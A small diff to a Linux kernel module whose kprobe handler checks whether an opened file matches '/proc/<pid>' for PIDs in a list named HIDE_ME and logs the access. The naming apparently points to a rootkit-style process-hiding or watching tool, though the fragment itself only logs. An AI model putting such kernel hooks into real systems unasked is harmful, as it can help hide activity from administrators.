@@ -138,7 +138,7 @@ int monitor_handle(struct kprobe *p, struct pt_regs *regs) {
       int i;
       for (i = 0; i < HIDE_ME_MAX; i++) {
         char str[20];
-        sprintf(str, "%d", HIDE_ME[i]);
+        sprintf(str, "/proc/%d", HIDE_ME[i]);
         if (strstr(filename, str) && HIDE_ME[i] != 0) {
           printk(KERN_INFO "Opening /proc file: %s by %s (PID: %d)\n", filename,
                  current->comm, current->pid);
